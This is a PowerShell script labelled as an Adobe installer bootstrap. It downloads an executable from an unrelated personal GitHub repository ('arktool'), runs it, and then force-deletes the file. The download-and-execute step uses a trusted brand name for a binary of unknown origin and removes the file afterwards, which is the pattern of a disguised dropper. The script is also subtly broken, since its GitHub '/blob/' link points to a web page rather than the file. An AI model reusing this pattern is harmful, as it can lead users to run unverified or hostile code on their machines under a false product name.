# ============================================================
# Adobe Installer Bootstrap
# Downloads adobeinstallerpy.exe from GitHub
# Executes it
# Logs all actions
# Removes downloaded EXE afterwards
# ============================================================

$ErrorActionPreference = "Stop"

# CHANGE THIS TO YOUR GITHUB URL
$DownloadUrl = "https://github.com/arkkad3/arktool/blob/Utility/adobeacrobatdc.exe"

$TempFolder = Join-Path $env:TEMP "AdobeInstaller"
$ExeFile = Join-Path $TempFolder "adobeinstallerpy.exe"

$LogFolder = Join-Path $PSScriptRoot "logs"

if (!(Test-Path $LogFolder)) {
    New-Item -ItemType Directory -Path $LogFolder | Out-Null
}

$LogFile = Join-Path $LogFolder ("Install_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".log")

function Write-Log {
    param([string]$Message)

    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message"

    Write-Host $line
    Add-Content -Path $LogFile -Value $line
}

try {

    Write-Log "===== Adobe Installation Started ====="

    if (!(Test-Path $TempFolder)) {
        New-Item -ItemType Directory -Path $TempFolder | Out-Null
    }

    Write-Log "Downloading installer..."

    Invoke-WebRequest `
        -Uri $DownloadUrl `
        -OutFile $ExeFile

    Write-Log "Download completed."

    Write-Log "Launching installer..."

    $process = Start-Process `
        -FilePath $ExeFile `
        -Wait `
        -PassThru

    Write-Log "Installer exited with code $($process.ExitCode)"

    if ($process.ExitCode -eq 0) {
        Write-Log "SUCCESS"
    }
    else {
        Write-Log "FAILED"
    }

}
catch {

    Write-Log "ERROR"

    Write-Log $_.Exception.Message

}
finally {

    if (Test-Path $ExeFile) {
        Remove-Item $ExeFile -Force
        Write-Log "Installer removed."
    }

    Write-Log "===== Finished ====="

}
